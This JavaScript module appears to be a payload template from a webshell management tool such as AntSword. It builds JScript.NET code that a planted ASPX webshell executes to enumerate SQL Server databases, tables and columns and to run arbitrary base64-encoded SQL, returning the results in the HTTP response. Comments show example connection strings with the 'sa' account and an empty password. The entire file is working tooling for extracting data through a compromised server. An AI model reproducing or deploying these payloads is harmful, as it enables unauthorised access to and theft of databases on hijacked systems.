/**
 * ASPX::mysql数据库驱动代码模板
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _:
      `var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open("SELECT [name] FROM master.dbo.sysdatabases ORDER BY 1",Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+"\\t");Rs.MoveNext();}Rs.Close();Conn.Close();`,
    [arg1]: '#{base64::conn}'
  },
  // 显示数据库所有表
  show_tables: {
    _:
      `var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open("USE ["+Request.Item["${arg2}"]+"];SELECT [name] FROM sysobjects WHERE (xtype=\'U\') ORDER BY 1",Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+"\\t");Rs.MoveNext();}Rs.Close();Conn.Close();`,
    [arg1]: '#{base64::conn}',
    [arg2]: '#{dbname}'
  },
  // 显示表字段
  show_columns: {
    _:
      `var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])),Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+" ("+Rs.Fields(1).Value+")\\t");Rs.MoveNext();}Rs.Close();Conn.Close();`,
    // Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=
    [arg1]: '#{base64::conn}',
    // USE [database1];SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id(\'table1\') and A.xtype=B.xtype ORDER BY A.colid
    [arg2]: '#{base64::sql}',
  },
  // 执行SQL语句
  query: {
    _:
      `var Conn=new ActiveXObject("Adodb.connection");var strSQL:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));Conn.ConnectionTimeout=10;Conn.Open();var CO:String="\\t|\\t",RN:String="\\r\\n",Dat:String;Conn.DefaultDatabase="${arg3}";var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.Count,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.BOF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();`,
    // Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=
    [arg1]: '#{base64::conn}',
    // SELECT TOP 20 * FROM table1 ORDER BY 1 DESC
    [arg2]: '#{base64::sql}',
    [arg3]: '#{dbname}'
  }
})
